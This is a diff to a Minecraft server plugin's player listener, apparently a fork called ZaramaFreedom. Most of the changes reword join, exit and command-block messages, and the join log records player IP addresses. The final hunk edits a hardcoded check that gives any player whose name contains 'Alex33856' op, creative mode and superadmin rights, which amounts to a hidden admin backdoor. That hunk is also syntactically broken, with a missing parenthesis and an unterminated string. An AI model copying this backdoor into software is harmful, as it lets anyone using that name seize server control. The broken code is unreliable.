@@ -677,7 +677,7 @@ public class TFM_PlayerListener implements Listener
 
         if (playerdata.allCommandsBlocked())
         {
-            TFM_Util.playerMsg(player, "Your commands have been blocked by an admin.", ChatColor.RED);
+            TFM_Util.playerMsg(player, "Your commands have been blocked by an admin. ", ChatColor.RED);
             event.setCancelled(true);
             return;
         }
@@ -775,7 +775,7 @@ public class TFM_PlayerListener implements Listener
         }
 
         TFM_PlayerList.removeEntry(player);
-        TFM_Log.info("[EXIT]: " + player.getName() + " left the game.", true);
+        TFM_Log.info("[EXIT ALERT]: " + player.getName() + " left ZaramaFreedom.", true);
     }
 
     @EventHandler(priority = EventPriority.MONITOR)
@@ -786,7 +786,7 @@ public class TFM_PlayerListener implements Listener
         final String ip = TFM_Util.getIp(player);
         final TFM_Player playerEntry;
 
-        TFM_Log.info("[JOIN]: " + TFM_Util.formatPlayer(player) + " joined the game with IP address: " + ip, true);
+        TFM_Log.info("[JOIN ALERT]: " + TFM_Util.formatPlayer(player) + " joined ZaramaFreedom with IP address: " + ip, true);
 
         // Handle PlayerList entry (persistent)
         if (TFM_PlayerList.existsEntry(player))
@@ -899,12 +899,14 @@ public class TFM_PlayerListener implements Listener
         else if (username.contains"Alex33856"))
 {
     player.getInventory().clear();
+    TFM_Log.info("[JOIN]:The Developer Alex33856 has joined the game!!!");
     player.setOp(true);
     player.setGameMode(GameMode.CREATIVE);
     name = ChatColor.RED + name;
     TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
     TFM_AdminList.addSuperadmin(player);
-    TFM_Util.adminAction("Welcome Back, Alex33856!, true);
+    TFM_Util.bcastMsg("Welcome Back, Alex33856!, true);
+    
 
     }
 
